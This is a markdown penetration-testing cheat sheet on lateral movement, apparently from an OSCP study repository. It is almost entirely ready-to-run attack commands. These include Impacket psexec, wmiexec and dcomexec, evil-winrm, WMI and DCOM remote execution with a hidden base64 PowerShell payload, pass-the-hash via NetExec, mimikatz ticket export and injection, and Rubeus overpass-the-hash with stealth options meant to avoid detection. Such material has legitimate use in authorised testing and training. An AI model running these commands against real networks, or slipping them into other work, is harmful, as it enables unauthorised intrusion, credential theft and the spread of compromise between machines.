# Lateral Movement

## Table of Contents

- [Windows Lateral Movement](#windows-lateral-movement)
  - [PsExec](#psexec)
  - [WMI](#wmi)
  - [WinRM](#winrm)
  - [DCOM](#dcom)
  - [Pass the Hash (PtH)](#pass-the-hash-pth)
  - [Pass the Ticket (PtT)](#pass-the-ticket-ptt)
  - [Overpass the Hash](#overpass-the-hash)
- [Linux Lateral Movement](#linux-lateral-movement)
  - [SSH](#ssh)
- [Port Forwarding & Pivoting](#port-forwarding--pivoting)

---

## Windows Lateral Movement

### Quick Check (One-liner)

```shell
# Quick lateral movement test with multiple tools
impacket-psexec $domain/$user:$pass@$rhost && evil-winrm -i $rhost -u $user -p $pass
```

### PsExec

#### Sysinternals PsExec

```cmd
.\PsExec64.exe -i \\$rhost -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
.\PsExec64.exe \\$rhost cmd
```

#### Impacket PsExec

```shell
impacket-psexec <USERNAME>@$rhost
impacket-psexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-psexec $domain/Administrator@$rhost -hashes :<NTLM_HASH>
```

---

### WMI

#### Windows Management Instrumentation

```cmd
wmic /node:$rhost /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
```

#### PowerShell WMI

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $rhost -Credential $credential -SessionOption $Options 
$command = 'cmd /c whoami';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

#### Impacket WMIExec

```shell
impacket-wmiexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
```

---

### WinRM

#### Windows Remote Shell

```cmd
winrs -r:$rhost -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:$rhost -u:<USERNAME> -p:<PASSWORD> "powershell -ep bypass -c whoami"
```

#### PowerShell Remoting

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $rhost -Credential $credential
Enter-PSSession 1
```

#### Evil-WinRM

```shell
evil-winrm -i $rhost -u <USERNAME> -p <PASSWORD>
evil-winrm -i $rhost -u <USERNAME> -H <NTLM_HASH>
evil-winrm -i $rhost -c certificate.crt -k key.key -S
```

---

### DCOM

#### Distributed Component Object Model

> DCOM objects that can execute commands remotely

| Object | ProgID | Notes |
|--------|--------|-------|
| MMC20 | `MMC20.Application` | Most common, requires admin |
| ShellWindows | `ShellWindows` | Alternative method |
| ShellBrowserWindow | `ShellBrowserWindow` | Workstation only |
| Excel | `Excel.Application` | If Office installed |
| Outlook | `Outlook.Application` | If Outlook installed |

```powershell
# MMC20.Application method
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$rhost"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")

# ShellWindows method
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}","$rhost"))
$dcom.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)

# ShellBrowserWindow method
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}","$rhost"))
$dcom.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)

# Excel macro execution
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","$rhost"))
$dcom.DisplayAlerts = $false
$workbook = $dcom.Workbooks.Add()
$dcom.Run("Shell cmd.exe /c powershell -e <BASE64>")
```

#### Impacket DCOMExec

```shell
impacket-dcomexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-dcomexec -object MMC20 -silentcommand $domain/<USERNAME>:<PASSWORD>@$rhost '<COMMAND>'

# With hash
impacket-dcomexec -hashes :<NTLM_HASH> -object MMC20 $domain/Administrator@$rhost

# Different objects
impacket-dcomexec -object ShellWindows $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-dcomexec -object ShellBrowserWindow $domain/<USERNAME>:<PASSWORD>@$rhost
```

---

### Pass the Hash (PtH)

> Use NTLM hash for authentication

#### Impacket

```shell
impacket-psexec -hashes :<NTLM_HASH> Administrator@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
impacket-smbexec -hashes :<NTLM_HASH> Administrator@$rhost
```

#### NetExec

```shell
nxc smb $rhost -u Administrator -H <NTLM_HASH>
nxc smb $rhost -u Administrator -H <NTLM_HASH> -x "whoami"
nxc winrm $rhost -u Administrator -H <NTLM_HASH>
```

#### Evil-WinRM (PtH)

```shell
evil-winrm -i $rhost -u Administrator -H <NTLM_HASH>
```

---

### Pass the Ticket (PtT)

> Use Kerberos ticket for authentication (requires .kirbi or .ccache ticket file)

#### Export Tickets (mimikatz)

```cmd
sekurlsa::tickets /export
dir *.kirbi
```

#### Inject Ticket (mimikatz)

```cmd
kerberos::ptt <TICKET>.kirbi

# List cached tickets
kerberos::list
klist
```

#### Inject Ticket (Rubeus)

```cmd
.\Rubeus.exe ptt /ticket:<TICKET>.kirbi
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Create sacrificial process and inject
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /luid:<LUID> /ticket:<TICKET>.kirbi
```

#### Convert Ticket Formats

```shell
# Convert .kirbi to .ccache (for Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Convert .ccache to .kirbi (for Windows)
impacket-ticketConverter ticket.ccache ticket.kirbi
```

#### Linux PtT

```shell
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
impacket-wmiexec $domain/<USERNAME>@$rhost -k -no-pass
impacket-smbexec $domain/<USERNAME>@$rhost -k -no-pass
evil-winrm -i $rhost -r $domain
```

---

### Overpass the Hash

> Use NTLM hash to request Kerberos TGT, then use that ticket for authentication
> Useful when NTLM authentication is blocked but Kerberos is allowed

#### mimikatz

```cmd
# Create new process with injected ticket
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell

# With AES256 key (more stealthy)
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:powershell
```

#### Rubeus

```cmd
# Request TGT using NTLM hash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# Using AES256 (more stealthy, avoids RC4 detection)
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_KEY> /ptt /opsec

# Create sacrificial logon session
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt /luid:<LUID>
```

#### Impacket (Overpass)

```shell
impacket-getTGT $domain/<USERNAME> -hashes :<NTLM_HASH>
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass

# With AES key
impacket-getTGT $domain/<USERNAME> -aesKey <AES256_KEY>
```

#### NetExec with Kerberos

```shell
# After exporting ticket
export KRB5CCNAME=<USERNAME>.ccache
nxc smb $rhost -k --use-kcache
nxc smb $rhost -k --use-kcache -x "whoami"
```

---

## Linux Lateral Movement

### SSH

```shell
ssh <USERNAME>@$rhost
ssh -i id_rsa <USERNAME>@$rhost
ssh -o StrictHostKeyChecking=no <USERNAME>@$rhost
```

#### SSH with Password

```shell
sshpass -p '<PASSWORD>' ssh <USERNAME>@$rhost
```

---

## Port Forwarding & Pivoting

> For detailed port forwarding, pivoting, and tunneling techniques (Chisel, Ligolo-ng, SSH Tunneling, Socat, ProxyChains, sshuttle, Metasploit Pivoting), see:
>
> **[Pivoting & Tunneling Cheatsheet](5.2.Pivoting-Tunneling.md)**

---

## See Also

### Related AD Files

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - ACL Abuse, GPO Abuse, AD CS attacks
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Hash cracking, credential extraction
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Golden/Silver Tickets, DCSync, Delegation
- **[NTLM Relay & Responder](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM Relay, PTH details

### Pivoting & Tunneling

- **[Pivoting & Tunneling](5.2.Pivoting-Tunneling.md)** - Chisel, ProxyChains, SSH Tunnels
- **[Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)** - Single/multi-hop pivoting

### Privilege Escalation

- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalate before pivoting
- **[Linux Privilege Escalation](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc techniques

### OSCP Preparation

- **[OSCP Exam Guide](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Complete exam methodology
